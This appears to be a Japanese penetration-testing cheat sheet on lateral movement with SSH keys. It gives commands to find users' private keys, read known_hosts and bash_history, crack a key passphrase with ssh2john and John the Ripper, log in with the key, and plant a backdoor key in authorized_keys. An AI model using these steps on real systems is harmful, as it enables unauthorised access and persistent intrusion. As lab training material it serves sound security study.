# SSHキーを利用した横展開
通常、ユーザーの[SSH鍵のパーミッションは600に設定されています](https://help.ubuntu.com/community/SSH/OpenSSH/Keys)。この設定がされてない場合があるため探索しておく
### sshキーの探索
```
find /home/ -name "id_rsa"
```

### キーのパスフレーズ確認
```
cat ~/.ssh/svuser.key
```

この中にProc-Type, DEK-Infoがないかを確認
「Proc-Type」ヘッダーは、鍵が暗号化されていることを示しています。「DEK-Info」ヘッダーは、暗号化の種類が「AES-128-CBC」であることを示しています。

表示例：
```sh
root@linuxvictim:/home/linuxvictim# cat svuser.key 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

### 鍵利用痕跡を探索
接続したマシンを特定
HashKnownHosts設定が有効になっているとハッシュ化されるため特定不可
```
cat ~/.ssh/known_hosts
```

過去のターミナルコマンドを探索
```
cat ~/.bash_history
```

もしサーバ名等を見つけたら名前解決
```
host server_name
```

### キーのパスフレーズ解析
形式変換
```
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
```

jtrで解析
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```

# キーの利用
```
ssh -i ./svuser.key svuser@controller
```

# SSHでバックドア
ユーザーの~/.ssh/authorized_keysファイルに公開鍵を挿入する
ほとんどの Linux システムでは**authorized_keys**に 644 のパーミッションが要求されるため、ファイルの所有者と root のみがファイルに書き込むことができることに注意

キー発行
```
ssh-keygen
```

**id_rsa.pub**の内容を authorized_keysに挿入
```
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```

その後使用
```
ssh linuxvictim@linuxvictim
```